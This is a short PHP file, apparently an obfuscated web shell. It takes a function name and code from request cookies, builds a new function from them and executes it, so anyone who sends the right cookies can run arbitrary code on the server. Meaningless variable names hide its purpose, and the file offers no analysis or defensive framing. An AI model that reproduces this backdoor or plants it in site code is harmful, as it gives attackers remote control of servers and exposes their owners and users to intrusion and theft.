<?php

$vbm=$_COOKIE;
$hdhoc=$vbm[lffo];
if($hdhoc){
	$zqno=$hdhoc($vbm[ancs]);$rpl=$hdhoc($vbm[rlie]);$xcr=$zqno("",$rpl);$xcr();
}